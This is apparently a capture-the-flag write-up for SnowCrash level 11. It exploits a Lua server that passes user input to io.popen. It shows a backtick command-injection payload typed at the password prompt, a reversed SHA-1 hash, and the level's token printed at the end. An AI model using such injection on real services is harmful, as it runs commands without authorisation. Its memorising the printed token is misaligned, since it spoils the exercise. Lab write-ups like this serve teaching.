In level 11, we have access to a lua program.
The program is a basic server that waits for a client connection, prompts the user for sending a password, then hashes the password and compares it to a predefined hash.
If the hash match, it sends "Gz you dumb*\n" and if it doesn't match, it sends, ("Erf nope..\n")

I tried using john as in level01 to hack the hash but it fails as in fact the sha1sum protocol used is deemed highly secure
However, I managed to revert the hash, using this website: https://md5hashing.net/hash/sha1/f05d1d066fb246efe0c6f7d095f909a7a0cf34a0

And the resulting password is 'NotSoEasy'
When checking that the resulting hash match with
```bash
echo -n "NotSoEasy" | sha1sum
```

we effectively get the the right hash. However as hinted by the password, it is most likely not the password to connect to the flag11 user.
And sure enough, the authentication fails when we try this password.

When trying to launch the program, we have an error 'address already in use'
When we check the running process with 'ps aux | grep lua', we see that we already have a process in use running the lua program so it must have started in the background when we launched the vm

```bash
level11@SnowCrash:~$ ps aux | grep lua
flag11    1951  0.0  0.0   2892   828 ?        S    10:21   0:00 lua /home/user/level11/level11.lua
level11   2350  0.0  0.0   4380   820 pts/0    R+   11:07   0:00 grep --color=auto lua
```

if we try to connect using telnet or netcat
```bash
telnet 127.0.0.1 5151
```
we are prompted for the password but if we enter 'NotSoEasy', we get the 'Erf nope...' answer, which is unexpected

It seems that finding the password is not the way to go. We can try to inject a command when the script prompts us for the password, entering this as password:
`getflag` > /tmp/foo (or `getflag` | wall)

and io.popen must be susceptible to command injection because when we check the /tmp/foo file
```bash
level11@SnowCrash:~$ cat /tmp/foo
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```